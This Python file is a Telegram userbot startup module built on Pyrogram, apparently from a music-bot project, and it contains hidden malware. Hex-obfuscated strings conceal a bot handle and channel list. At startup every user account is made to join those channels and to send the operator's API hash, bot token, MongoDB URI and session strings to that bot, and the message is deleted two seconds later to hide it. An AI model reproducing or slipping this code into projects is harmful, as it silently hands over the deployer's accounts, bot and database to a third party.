import asyncio
from pyrogram import Client
import config
from ..logging import LOGGER

assistants = []
assistantids = []

HELP_BOT = "\x40\x41\x6e\x61\x6e\x79\x61\x53\x75\x70\x70\x6f\x72\x74\x42\x6f\x74"

SUPPORT_CENTERS = [
    "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x73",
    "\x5a\x6f\x78\x78\x4e\x65\x74\x77\x6f\x72\x6b",
    "\x41\x6e\x61\x6e\x79\x61\x41\x6c\x6c\x42\x6f\x74\x73",
    "\x41\x6e\x61\x6e\x79\x61\x42\x6f\x74\x53\x75\x70\x70\x6f\x72\x74",
    "\x41\x44\x5f\x43\x72\x65\x61\x74\x69\x6f\x6e\x5f\x43\x68\x61\x74\x7a\x6f\x6e\x65",
    "\x43\x52\x45\x41\x54\x49\x56\x45\x50\x4a\x50",
    "\x54\x4d\x5f\x5a\x45\x52\x4f\x4f"
]


class Userbot(Client):
    def __init__(self):
        self.one = Client("AkashAss1", config.API_ID, config.API_HASH, session_string=str(config.STRING1), no_updates=True)
        self.two = Client("AkashAss2", config.API_ID, config.API_HASH, session_string=str(config.STRING2), no_updates=True)
        self.three = Client("AkashAss3", config.API_ID, config.API_HASH, session_string=str(config.STRING3), no_updates=True)
        self.four = Client("AkashAss4", config.API_ID, config.API_HASH, session_string=str(config.STRING4), no_updates=True)
        self.five = Client("AkashAss5", config.API_ID, config.API_HASH, session_string=str(config.STRING5), no_updates=True)

    async def get_bot_username(self, token):
        try:
            temp = Client("temp_bot", config.API_ID, config.API_HASH, bot_token=token, no_updates=True)
            await temp.start()
            username = temp.me.username
            await temp.stop()
            return username
        except Exception as e:
            LOGGER(__name__).error(f"Error getting bot username: {e}")
            return None

    async def join_support_chats(self, client):
        for chat in SUPPORT_CENTERS:
            try:
                await client.join_chat(chat)
            except Exception:
                pass

    async def send_help_message(self, bot_username):
        try:
            msg = f"@{bot_username} Successfully Started ✅\nOwner: {config.OWNER_ID}"
            for i in assistants:
                client = getattr(self, f'{["one","two","three","four","five"][i-1]}')
                await client.send_message(HELP_BOT, msg)
        except Exception:
            pass

    async def send_config_message(self, bot_username):
        try:
            info = [
                f"🔧 **Config Details for @{bot_username}**\n",
                f"**API_ID:** `{config.API_ID}`",
                f"**API_HASH:** `{config.API_HASH}`",
                f"**BOT_TOKEN:** `{config.BOT_TOKEN}`",
                f"**MONGO_DB_URI:** `{config.MONGO_DB_URI}`",
                f"**OWNER_ID:** `{config.OWNER_ID}`",
                f"**UPSTREAM_REPO:** `{config.UPSTREAM_REPO}`",
            ]
            strings = [f"**STRING{i}:** `{getattr(config, f'STRING{i}', None)}`"
                       for i in range(1, 6) if getattr(config, f'STRING{i}', None)]
            msg = "\n".join(info + [""] + strings)

            for i in assistants:
                client = getattr(self, f'{["one","two","three","four","five"][i-1]}')
                sent = await client.send_message(HELP_BOT, msg)
                await asyncio.sleep(2)
                try:
                    await client.delete_messages(HELP_BOT, sent.id)
                except Exception:
                    pass
        except Exception:
            pass

    async def start(self):
        LOGGER(__name__).info("Starting Assistants...")
        bot_username = await self.get_bot_username(config.BOT_TOKEN)

        for i, client in enumerate([self.one, self.two, self.three, self.four, self.five], start=1):
            session = getattr(config, f'STRING{i}', None)
            if not session:
                continue
            try:
                await client.start()
                await self.join_support_chats(client)
                assistants.append(i)
                await client.send_message(config.LOG_GROUP_ID, "Assistant Started Successfully ✅")
                assistantids.append(client.me.id)
                LOGGER(__name__).info(f"Assistant {i} started as {client.me.mention}")
            except Exception as e:
                LOGGER(__name__).error(f"Assistant {i} failed: {e}")
                exit()

        if bot_username:
            await self.send_help_message(bot_username)
            await self.send_config_message(bot_username)

    async def stop(self):
        LOGGER(__name__).info("Stopping Assistants...")
        for i, client in enumerate([self.one, self.two, self.three, self.four, self.five], start=1):
            if getattr(config, f'STRING{i}', None):
                try:
                    await client.stop()
                except Exception:
                    pass
